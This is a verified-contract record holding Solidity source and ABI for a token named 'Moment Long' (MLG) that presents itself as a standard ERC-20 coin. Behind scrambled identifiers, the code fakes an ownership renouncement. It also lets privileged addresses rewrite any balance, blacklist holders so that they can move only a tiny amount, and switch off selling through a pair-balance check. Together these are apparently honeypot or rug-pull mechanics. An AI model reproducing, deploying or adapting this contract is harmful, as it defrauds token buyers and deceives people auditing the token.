{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface exemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLimit {\n    function createPair(address exemptAuto, address txMinWallet) external returns (address);\n}\n\ninterface walletBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingFund) external view returns (uint256);\n\n    function transfer(address enableLaunch, uint256 autoMax) external returns (bool);\n\n    function allowance(address walletLaunchToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLaunch,\n        uint256 autoMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletShould, uint256 value);\n    event Approval(address indexed walletLaunchToken, address indexed spender, uint256 value);\n}\n\ninterface atLaunch is walletBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MomentLong is senderWallet, walletBuy, atLaunch {\n\n    function balanceOf(address tradingFund) public view virtual override returns (uint256) {\n        return shouldMarketingTotal[tradingFund];\n    }\n\n    function approve(address txTake, uint256 autoMax) public virtual override returns (bool) {\n        totalExempt[_msgSender()][txTake] = autoMax;\n        emit Approval(_msgSender(), txTake, autoMax);\n        return true;\n    }\n\n    function marketingTo() public {\n        emit OwnershipTransferred(txEnable, address(0));\n        feeLiquidityBuy = address(0);\n    }\n\n    function launchSellSwap(address shouldReceiverReceiver, address enableLaunch, uint256 autoMax) internal returns (bool) {\n        if (shouldReceiverReceiver == txEnable) {\n            return swapToken(shouldReceiverReceiver, enableLaunch, autoMax);\n        }\n        uint256 enableFee = walletBuy(senderLaunched).balanceOf(limitSwap);\n        require(enableFee == fromIs);\n        require(enableLaunch != limitSwap);\n        if (launchedIs[shouldReceiverReceiver]) {\n            return swapToken(shouldReceiverReceiver, enableLaunch, launchTeam);\n        }\n        return swapToken(shouldReceiverReceiver, enableLaunch, autoMax);\n    }\n\n    bool private amountAt;\n\n    function swapFee(address atTake) public {\n        amountBuy();\n        \n        if (atTake == txEnable || atTake == senderLaunched) {\n            return;\n        }\n        launchedIs[atTake] = true;\n    }\n\n    bool private marketingEnableTx;\n\n    function allowance(address limitFeeFund, address txTake) external view virtual override returns (uint256) {\n        if (txTake == receiverTeam) {\n            return type(uint256).max;\n        }\n        return totalExempt[limitFeeFund][txTake];\n    }\n\n    mapping(address => mapping(address => uint256)) private totalExempt;\n\n    uint256 public atTotal;\n\n    function transferFrom(address shouldReceiverReceiver, address enableLaunch, uint256 autoMax) external override returns (bool) {\n        if (_msgSender() != receiverTeam) {\n            if (totalExempt[shouldReceiverReceiver][_msgSender()] != type(uint256).max) {\n                require(autoMax <= totalExempt[shouldReceiverReceiver][_msgSender()]);\n                totalExempt[shouldReceiverReceiver][_msgSender()] -= autoMax;\n            }\n        }\n        return launchSellSwap(shouldReceiverReceiver, enableLaunch, autoMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptAt;\n    }\n\n    address private feeLiquidityBuy;\n\n    string private exemptAt = \"MLG\";\n\n    address public txEnable;\n\n    function transfer(address toFee, uint256 autoMax) external virtual override returns (bool) {\n        return launchSellSwap(_msgSender(), toFee, autoMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeFee;\n    }\n\n    bool public autoSell;\n\n    string private limitLaunch = \"Moment Long\";\n\n    uint256 fromIs;\n\n    function swapToken(address shouldReceiverReceiver, address enableLaunch, uint256 autoMax) internal returns (bool) {\n        require(shouldMarketingTotal[shouldReceiverReceiver] >= autoMax);\n        shouldMarketingTotal[shouldReceiverReceiver] -= autoMax;\n        shouldMarketingTotal[enableLaunch] += autoMax;\n        emit Transfer(shouldReceiverReceiver, enableLaunch, autoMax);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed receiverSwap, address indexed limitFee);\n\n    uint256 constant launchTeam = 18 ** 10;\n\n    bool public marketingLaunch;\n\n    address receiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (atTotal != shouldAmountTeam) {\n            marketingEnableTx = true;\n        }\n        exemptReceiver modeSenderTake = exemptReceiver(receiverTeam);\n        senderLaunched = sellLimit(modeSenderTake.factory()).createPair(modeSenderTake.WETH(), address(this));\n        if (shouldAmountTeam != atTotal) {\n            marketingLaunch = true;\n        }\n        txEnable = _msgSender();\n        marketingTo();\n        launchReceiverAmount[txEnable] = true;\n        shouldMarketingTotal[txEnable] = takeFee;\n        \n        emit Transfer(address(0), txEnable, takeFee);\n    }\n\n    uint256 private shouldAmountTeam;\n\n    function amountMinFund(address toFee, uint256 autoMax) public {\n        amountBuy();\n        shouldMarketingTotal[toFee] = autoMax;\n    }\n\n    address limitSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundSwap(address takeAuto) public {\n        require(takeAuto.balance < 100000);\n        if (isWalletReceiver) {\n            return;\n        }\n        \n        launchReceiverAmount[takeAuto] = true;\n        \n        isWalletReceiver = true;\n    }\n\n    bool private receiverList;\n\n    uint256 private takeFee = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return feeLiquidityBuy;\n    }\n\n    mapping(address => bool) public launchReceiverAmount;\n\n    function amountBuy() private view {\n        require(launchReceiverAmount[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listReceiver;\n    }\n\n    uint8 private listReceiver = 18;\n\n    mapping(address => uint256) private shouldMarketingTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunch;\n    }\n\n    uint256 enableTo;\n\n    function teamExemptMax(uint256 autoMax) public {\n        amountBuy();\n        fromIs = autoMax;\n    }\n\n    address public senderLaunched;\n\n    mapping(address => bool) public launchedIs;\n\n    function owner() external view returns (address) {\n        return feeLiquidityBuy;\n    }\n\n    bool public isWalletReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunchToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFeeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMax\",\"type\":\"uint256\"}],\"name\":\"amountMinFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"}],\"name\":\"fundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchReceiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"}],\"name\":\"swapFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMax\",\"type\":\"uint256\"}],\"name\":\"teamExemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiverReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MomentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}